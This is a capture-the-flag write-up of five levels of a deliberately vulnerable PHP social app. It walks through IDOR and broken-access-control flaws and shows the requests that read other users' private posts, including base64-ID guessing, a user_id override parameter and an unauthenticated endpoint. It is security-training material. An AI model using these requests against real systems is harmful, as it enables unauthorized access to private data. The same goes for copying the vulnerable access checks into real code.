@@ -1,0 +1,498 @@
+[Level 1]
+
+[*] Target: http://localhost:24001
+
+    - I know, I know, you might think "Come on, this's just IDOR, no need to analyze the source code, turn on the burpsuite and start changing the ID please"
+
+      [!] Hold on my friend, mindset is everything, burpsuite makes things done, but whitebox makes things clear
+
+    - In the index.php, you can see there are Login and Register forms. Oh hoo! what's going on here "Fakebook helps you connect and stalk your crush" (~.~!)
+
+    - Let's say that you created an account and do the normal activities of a normal user
+
+        => After logging in, you create a random post and click on "Submit", a message in JSON format appeared said that "Post Created", 
+           then you were redirected back to the wall.php with your post shown there
+
+    - Things started with index.php right, we gonna see that first
+
+        [+] index.php 
+
+            session_start();
+            include("libs/db.php");
+            
+            /*
+                db.php isn't something special, just used to connect to the databases
+                However, there are some functions we might need to care about
+                    ...
+                    $connectionString = "mysql:host=$hostname;dbname=$database";
+                    $conn = new \PDO($connectionString, $username, $password);
+                    ...
+                    function exec_query($query, ...$values){
+
+                    // [?] $query: This is the SQL query that you want to execute. It is a mandatory parameter.
+                    // [?] ellipsis (...) before $values indicates that you can pass a variable number of arguments after the $query. 
+                    //     => These values are likely used as parameters to be bound to the query to avoid SQL injection
+
+                        global $conn;
+                        try {
+                            $sth = $conn->prepare($query);
+                            $sth->execute($values);
+                            $sth->setFetchMode(PDO::FETCH_ASSOC);
+                            return $sth;
+                        } ...
+                    };
+                    function select_all($query, ...$values){
+                        $res = exec_query($query, ...$values);
+                        return $res->fetchAll(); // [?] fetch all rows from the result set returned by a database query.
+                    }
+
+                    function select_one($query, ...$values){
+                        $res = exec_query($query, ...$values);
+                        return $res->fetch(); // [?] fetch a single row from the result set
+                    }
+            */
+            
+            if (isset($_GET["action"])) {
+                switch ($_GET["action"]) {
+                    case "login":
+                        $res = select_one("SELECT user_id, username FROM users WHERE username = ? AND password = ?", $_POST['username'], $_POST['password']);
+
+                    /*
+                        This is my database, just to make sure that you don't misunderstand some parameters
+
+                        mysql> select * from users;
+                        +---------+-----------+-----------------+
+                        | user_id | username  | password        |
+                        +---------+-----------+-----------------+
+                        |       1 | admin     | thisisapassword |
+                        |       2 | crush     | 1z8m81z2y1zy28z |
+                        |       3 | thinhtran | thunderwarrior  |
+                        +---------+-----------+-----------------+
+                    */
+
+                        if ($res) {
+                            $_SESSION['user_id'] = $res['user_id'];
+
+                            /* 
+                                [?] Set user_id in the global var SESSION, this is served as a part of the authentication mechanism (check auth.php)  
+                                    ...
+                                    if (!isset($_SESSION["user_id"]))
+                                        die(header("Location: /index.php"));
+                            */        
+
+                            header("Location: /wall.php");
+                            echo "Login successfully";
+                        } else {
+                            header('Refresh:2; url=index.php');
+                            echo "Wrong username or password";
+                        }
+                        die();
+                    ...
+                }
+            }
+
+    - Nothing special! Let's see what's going on in the post.php
+
+        [+] post.php
+            ....
+            switch ($_GET['action']) {
+                case 'list_posts':
+                    $res = select_all( // [?] Remind: fetchAll() function in the db.php
+                        'SELECT post_id, public FROM posts WHERE author_id = ?',
+                        $user_id
+                    );
+                    echo json_encode($res);
+                    break;
+                case 'read':
+                    $post = select_one(
+                        'SELECT content, public, author_id FROM posts WHERE post_id = ?',
+                        $_GET['id'] // [?] This one might be the IDOR we are looking for since there is no filter to protect it from the attacker
+                    );    
+                    if ($post)
+                        echo json_encode($post);
+                    else
+                        echo json_encode("Not Found");
+                    break;
+                case 'create':
+                    $res = exec_query(
+                        'INSERT INTO posts (content, public, author_id) VALUES (?, ?, ?);', $_POST['content'], $_POST['public'], $user_id);
+                    header('Refresh:2; url=wall.php'); // Redirect back to the wall.php after 2s
+                    echo json_encode('Post created');
+                    break;
+            }
+
+    - Cool, we found something helpful, but still, we don't know where to find the "read" action, let's keep moving
+
+    - When I was going to analyse the wall.php, I realized that this is just like an html file, but I found app.js which is related to this and has an important role
+
+        [+] wall.php
+            ...
+                <div class="row">
+                    <div class="col-sm-12 mt-5 text-center">
+                        <h2>Posts</h2>
+                    </div>
+                    <div class="col-sm-12 text-center">
+                        <div id="wall"></div>
+                    </div>
+                </div>
+
+            </div>
+            <script src="/static/js/app.js"></script>
+            ...
+
+        [+] app.js 
+
+            async function list_posts() { // [?] Keywords for someone who doesn't know _ "Async and await" + "Promise" + "Callback Hell"
+                var url = "/post.php?action=list_posts"; 
+                var response = await fetch(url); // [?] sends a request to "/post.php?action=list_posts" using the fetch function.
+                return await response.json()
+            }
+
+            async function read_post(post_id) { // [?] This is an anonymous function that takes the posts parameter
+                var url = `/post.php?action=read&id=${post_id}`;
+                var response = await fetch(url); // [?] Hehe, he's here (^.^`) 
+                return await response.json()
+            }
+
+            function main() {
+                list_posts().then(function (posts) {
+                    var wall = document.getElementById("wall"); // [?] Gets a reference to an HTML element with the id "wall" <=> <div id="wall"></div>
+                    posts.forEach(async function (post) {
+                        var p = document.createElement("p"); // [?] For each post in the result, it creates a paragraph element (<p>)
+                        if (post.public == "1") {
+                            await read_post(post.post_id).then(function (post_data) {
+                                p.innerText = "[public icon] " + post_data["content"];
+                            })
+                        } else {
+                            await read_post(post.post_id).then(function (post_data) {
+                            p.innerText = "[private icon] " + post_data["content"];
+                            })
+                        }
+                        wall.appendChild(p); // [?] This's why you see all the posts you wrote
+                    })
+                });
+            }
+            main();
+
+    - Of course, you might not understand it immediately, but this is the logic to exploit the IDOR vulnerability in this case
+
+        [1] First stuff, when you create a post (in public mode or private, whatever) you will see the "Post Created" 
+            and then you will be redirected back to wall.php after 2s
+            
+                ...
+                case 'create':
+                    $res = exec_query(
+                        'INSERT INTO posts (content, public, author_id) VALUES (?, ?, ?);', $_POST['content'], $_POST['public'], $user_id);
+                    header('Refresh:2; url=wall.php');
+                    echo json_encode('Post created');
+                    break;
+
+        [2] And, then in wall.php you have app.js which contains
+
+            async function read_post(post_id) { 
+                var url = `/post.php?action=read&id=${post_id}`;
+                var response = await fetch(url);
+                return await response.json()
+            }
+
+            => This code will sent in a request in the format like 
+               /post.php?action=read&id=[you can change this to whatever you want in this case it is the id of other's post]
+
+        [3] After that, your post will be printed out by the "list_posts().then(function (posts) {...})", and combined with this in the post.php
+                ...
+                case 'read':
+                    $post = select_one(
+                        'SELECT content, public, author_id FROM posts WHERE post_id = ?',$_GET['id'] );    
+                    if ($post)
+                        echo json_encode($post);
+                    else
+                        echo json_encode("Not Found");
+                    break;
+            
+            => Now, you can print out the posts of others (admin or crush)
+
+    [Testing time] This is my "posts" database
+
+            +---------+----------------------------------------------------------------------+-----------+--------+
+            | post_id | content                                                              | author_id | public |
+            +---------+----------------------------------------------------------------------+-----------+--------+
+            |       1 | Welcome to Fakebook! Fakebook helps you connect and stalk your crush |         1 |      1 |
+            |       2 | Nice catch! You are rewarded XXXX$ by Fakebook                       |         1 |      0 |
+            |       3 | Thich nhat may anh hacker <3 CBJS{FAKE_FLAG_FAKE_FLAG} <3            |         2 |      0 |
+            |       4 | Wanna play Yugioh (~.~?)                                             |         3 |      1 |
+            +---------+----------------------------------------------------------------------+-----------+--------+
+
+            "Post created" -> GET /wall.php -> GET /post.php?action=list_posts -> GET /post.php?action=read&id=3 (I changed the id to print out the flag)
+
+            => Thich nhat may anh hacker <3 CBJS{FAKE_FLAG_FAKE_FLAG} <3
+
+    [Final Result: Read others's post] Crush: Thich nhat may anh hacker <3 CBJS{FAKE_FLAG_FAKE_FLAG} <3
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 2]
+
+[*] Target: http://localhost:24002
+
+    - When I was just looking through the code, I thought there was no difference between this lab and the previous one, but this thing happened
+
+        GET /post.php?action=read&id=MDAwMDA0 HTTP/1.1
+        Host: localhost:24002
+        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
+        ...
+
+        => This ID looked weird because there is a little bit of change
+
+        [+] db.php
+
+            function generate_id()
+            {
+                $data = select_one('SELECT num_posts FROM counters');
+                $current_idx = sprintf('%06d', $data['num_posts'] + 1); // [?] formats the incremented value as a 6-digit number
+                return base64_encode($current_idx); // [?] encodes the formatted index
+            }        
+
+        [+] post.php
+
+            case 'create':
+                $res = exec_query(
+                    'INSERT INTO posts (post_id, content, public, author_id) VALUES (?, ?, ?, ?);', generate_id(), $_POST['content'], $_POST['public'], $user_id);
+                header('Refresh:2; url=wall.php');
+                echo json_encode('Post created');
+                break;
+
+        [!] Just to make sure you understand, this is my database
+
+            mysql> select * from counters;
+            +-----------+
+            | num_posts |
+            +-----------+
+            |         4 |
+            +-----------+
+            1 row in set (0.00 sec)
+
+            mysql> select * from posts;
+            +----------+----------------------------------------------------------------------+-----------+--------+
+            | post_id  | content                                                              | author_id | public |
+            +----------+----------------------------------------------------------------------+-----------+--------+
+            | MDAwMDA0 | Warhammer 40k Space Marine 2!                                        |         3 |      0 | // [?] echo "MDAwMDA0" | base64 -d <=> 000004
+            | MDAwMDAx | Welcome to Fakebook! Fakebook helps you connect and stalk your crush |         1 |      1 | // [?] echo "MDAwMDAx" | base64 -d <=> 000001
+            | MDAwMDAy | Nice catch! You are rewarded XXXX$ by Fakebook                       |         1 |      0 | // [?] echo "MDAwMDAy" | base64 -d <=> 000002
+            | MDAwMDAz | Thich nhat may anh hacker <3 CBJS{FAKE_FLAG_FAKE_FLAG} <3            |         2 |      0 | // [?] echo "MDAwMDAz" | base64 -d <=> 000003
+            +----------+----------------------------------------------------------------------+-----------+--------+ 
+
+    => Easy (^.^`) Let's capture the flag
+
+        GET /post.php?action=read&id=MDAwMDAz HTTP/1.1
+        Host: localhost:24002
+        User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0
+        ...
+
+        => Thich nhat may anh hacker <3 CBJS{FAKE_FLAG_FAKE_FLAG} <3
+
+    [Final Result: Read others's post] Crush: Thich nhat may anh hacker <3 CBJS{FAKE_FLAG_FAKE_FLAG} <3
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 3]
+
+[*] Target: http://localhost:24003
+
+    - Cool! This one allows us to see others' public posts (both admin and crush), Let's say the target is still reading the flag, which is in a crush's private post
+
+        [+] wall.php
+
+            ...
+            if (isset($_GET["user_id"])) {
+                $data = select_one("SELECT username FROM users WHERE user_id = ?", $_GET["user_id"]);
+                $username = $data["username"];
+            }
+            
+        [+] app.js
+
+            var user_id = new URL(location.href).searchParams.get('user_id'); // [?] extracts the value of the parameter 'user_id' from the current URL.
+
+            async function list_posts() {
+                var url = "/post.php?action=list_posts" + (user_id ? `&user_id=${user_id}` : "");
+                // [?] Checks if user_id has a value. If it does, it adds &user_id= followed by the actual value; otherwise, it adds an empty string.
+                var response = await fetch(url);
+                return await response.json()
+            }
+            ...
+            list_posts().then(function (posts) {
+                    var wall = document.getElementById("wall");
+                    posts.forEach(async function (post) {
+                        var p = document.createElement("p");
+                        if (post.public == "1") {
+                            await read_post(post.post_id).then(function (post_data) {
+                                p.innerText = "[public icon] " + post_data["content"];
+                            })
+                        } else {
+                            if (location.href.includes("user_id")) { // [?] This condition prevents us from reading others's private posts! What a smart trick
+                                p.innerHTML = "[private icon] <i>You don't have permission to view this content</i>";
+                            } else {
+                                await read_post(post.post_id).then(function (post_data) {
+                                    p.innerText = "[private icon] " + post_data["content"];
+                                })    
+                            }
+                        }
+                        wall.appendChild(p);
+                    })
+                }); ...
+
+        [+] post.php
+
+            ...
+            case 'read':
+                $post = select_one(
+                    'SELECT content, public, author_id FROM posts WHERE post_id = ?', $_GET['id']);
+                if ($post)
+                    echo json_encode($post); // [?] The line that gives us what we need in this case (^.^~)
+                else
+                    echo json_encode("Not Found");
+                break;
+            ...
+
+            => Which mean (~.~!)
+
+                GET /wall.php?user_id=2 
+
+                        |
+                        v
+                
+                GET /post.php?action=list_posts&user_id=2 HTTP/1.1
+                        
+                        |
+                        v
+
+                HTTP/1.1 200 OK
+                ...
+                [{"post_id":"38405b03f1c29368beaaa94f24a1c893","public":"0"}]
+
+    
+    - Now we are albe to get crush's post id, then with the same exploit method as the previous labs, we can easily bypass authenticate condition
+
+        if (location.href.includes("user_id")) { 
+            p.innerHTML = "[private icon] <i>You don't have permission to view this content</i>";
+            ...
+        }
+
+    => GET /post.php?action=read&id=38405b03f1c29368beaaa94f24a1c893 => Thich nhat may anh hacker <3 CBJS{FAKE_FLAG_FAKE_FLAG} <3
+
+    [Final Result: Read others's post] Crush: Thich nhat may anh hacker <3 CBJS{FAKE_FLAG_FAKE_FLAG} <3
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 4]
+
+[*] Target: http://localhost:24004
+
+    - Woah! The developer is truly developed (~.~!)
+
+        [+] post.php
+            ...
+            case 'read':
+                $post = select_one(
+                    'SELECT content, public, author_id FROM posts WHERE post_id = ? AND (public = 1 OR author_id = ?)', $_GET['id'], $user_id);
+                if ($post)
+                    echo json_encode($post);
+                else
+                    echo json_encode("Not Found");
+                break;
+            ...
+        
+            => This means that the reader of the private post must be the owner of that post! Smart one
+
+                => GET /post.php?action=list_posts&user_id=2 <=> [{"post_id":"a7381cbd118b5699a69c576c7a2205ef","public":"0"}]
+
+                => GET /post.php?action=read&id=a7381cbd118b5699a69c576c7a2205ef <=> "Not Found" (undefined)
+
+                <=> 'SELECT content, public, author_id FROM posts WHERE post_id ='a7381cbd118b5699a69c576c7a2205ef' AND (public = 1 OR author_id = 3)
+
+                => This condition doesn't satisfy and data in the db
+
+        - Now we know the biggest problem is ... ( ... post_id = ? AND (public = 1 OR author_id = ?)', $_GET['id'], $user_id); ...
+
+    - The main question is "Can we control that $user_id?". Luckily! Yes, CBJS gave us a small key to bypass this security mechanism
+
+        [+] post.php (I think this detail isn't practical at all, might be that CBJS just wants us to understand stuff)
+
+            $user_id = $_SESSION['user_id'];
+            if (isset($_GET['user_id']))
+                $user_id = $_GET['user_id'];
+            ...
+
+        => This means that if user_id exists in the URL, it will override the original $user_id
+
+        => GET /post.php?action=read&id=a7381cbd118b5699a69c576c7a2205ef&user_id=2 
+        
+        <=> {"content":"Thich nhat may anh hacker <3 CBJS{FAKE_FLAG_FAKE_FLAG} <3","public":"0","author_id":"2"}
+
+    [Final Result: Read others's post] Crush: Thich nhat may anh hacker <3 CBJS{FAKE_FLAG_FAKE_FLAG} <3
+
+
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+
+[Level 5]
+
+[*] Target: http://localhost:24005
+
+    - Ohh! The trick user_id is now negated
+        
+        [+] post.php
+            ...
+            case 'read':
+                $post = select_one(
+                    'SELECT content, public, author_id FROM posts
+                    WHERE post_id = ? AND (public = 1 OR author_id = ?)',
+                    $_GET['id'],
+                    $_SESSION['user_id'] // [?] CBJS use session user id directly (~.~!)
+                );
+                if ($post)
+                    echo json_encode($post);
+                else
+                    echo json_encode("Not Found");
+                break;
+            ...
+
+    - This level made me confused for a long time since I didn't know what to do but when I tried to think of a role of a blackbox guy
+      I think I got something really cool (^.^`)
+
+    - Now press F12 and open the "Network", then refresh the webpage, you are now able to read app.js (http://localhost:24005/static/js/app.js)
+
+        Boom! 
+        ...
+        async function push_noti(message) {
+            var url = "/system_notification.php"; [!] A hidden blade (^.^~)
+            const data = new URLSearchParams();
+            data.append("content", message);
+            var response = await fetch(url, {
+                body: data,
+                method: "POST"
+            });
+            console.log(await response);
+        }
+        ...
+
+    - Guess what, you can access http://localhost:24005/system_notification.php normally without providing any credential
+
+        [+] system_notification.php
+
+            <?php
+            if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+                if (isset($_POST["content"])) {
+                    include "libs/db.php";
+                    exec_query('INSERT INTO notifications (content) VALUES (?)', $_POST["content"]);
+                ... } ... }
+            ?> 
+
+            => No session, no login form (~.~!)
+
+    [Final Result: Broken Access Control] System notifications: Wanna play Yugioh (~.~?)
